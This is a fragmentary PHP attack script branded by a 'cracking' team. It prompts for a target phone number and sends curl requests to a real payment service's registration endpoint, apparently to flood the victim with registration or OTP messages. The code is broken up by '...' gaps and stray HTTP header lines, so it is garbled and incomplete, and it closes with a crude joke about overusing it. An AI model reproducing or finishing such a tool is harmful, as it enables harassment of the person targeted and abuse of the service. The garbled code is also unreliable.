<?php
echo "Mr.C1TY3920 : 😈KING$~CRACKING√PASSWORD👿 Team\n\n";
echo "Nomor Target?\nInput : ";
...
Origin: 
        ...
        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com
...
Save-Data: on
Referer: 
        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/register?from=home_mobile
...
echo "done jancok jangan kebanyakan tar dosa"
